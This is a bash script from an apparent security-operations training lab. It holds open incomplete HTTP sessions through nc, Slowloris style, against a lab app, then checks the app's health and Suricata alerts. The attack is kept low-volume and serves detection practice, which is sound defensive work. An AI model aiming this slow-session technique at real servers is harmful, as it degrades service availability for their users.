#!/bin/bash
# SOC-Lab Attack Script: S11 - L5 Session Stress
# Purpose: Hold small, incomplete HTTP sessions to observe timeout behavior.

set -euo pipefail

TARGET="${TARGET:-app}"
TARGET_PORT="${TARGET_PORT:-3000}"
SESSIONS="${SESSIONS:-20}"
HOLD_SECONDS="${HOLD_SECONDS:-6}"
OUTPUT_DIR="${OUTPUT_DIR:-/results}"

mkdir -p "$OUTPUT_DIR"
OUTPUT_FILE="$OUTPUT_DIR/s11_l5_session_stress_$(date +%Y%m%d_%H%M%S).txt"

open_incomplete_session() {
    # Keep the request intentionally incomplete. This models session pressure
    # without high-volume traffic so the exercise remains safe on laptops.
    {
        printf 'GET / HTTP/1.1\r\n'
        printf 'Host: %s\r\n' "$TARGET"
        sleep "$HOLD_SECONDS"
    } | nc -w "$((HOLD_SECONDS + 2))" "$TARGET" "$TARGET_PORT" >/dev/null 2>&1 || true
}

{
    echo "============================================"
    echo "SOC-Lab Scenario S11: L5 Session Stress"
    echo "============================================"
    echo "Target: $TARGET:$TARGET_PORT"
    echo "Sessions: $SESSIONS"
    echo "Hold seconds: $HOLD_SECONDS"
    echo "Time: $(date -Iseconds)"
    echo ""

    echo "Phase 1: Baseline health"
    curl -sS -o /dev/null -w 'HTTP %{http_code}, time %{time_total}s\n' "http://$TARGET:$TARGET_PORT/health" || true
    echo ""

    echo "Phase 2: Opening incomplete sessions"
    for i in $(seq 1 "$SESSIONS"); do
        open_incomplete_session &
        if [ $((i % 5)) -eq 0 ]; then
            echo "  opened $i/$SESSIONS"
        fi
    done

    wait
    echo ""

    echo "Phase 3: Health after session pressure"
    curl -sS -o /dev/null -w 'HTTP %{http_code}, time %{time_total}s\n' "http://$TARGET:$TARGET_PORT/health" || true
    echo ""

    echo "Check detection:"
    echo "  docker exec soc-lab-suricata grep -E 'L5|DOS|Slowloris' /var/log/suricata/fast.log || true"
    echo "  docker exec soc-lab-app tail -50 /var/log/app/access.log"
} | tee "$OUTPUT_FILE"

echo ""
echo "Results saved to: $OUTPUT_FILE"

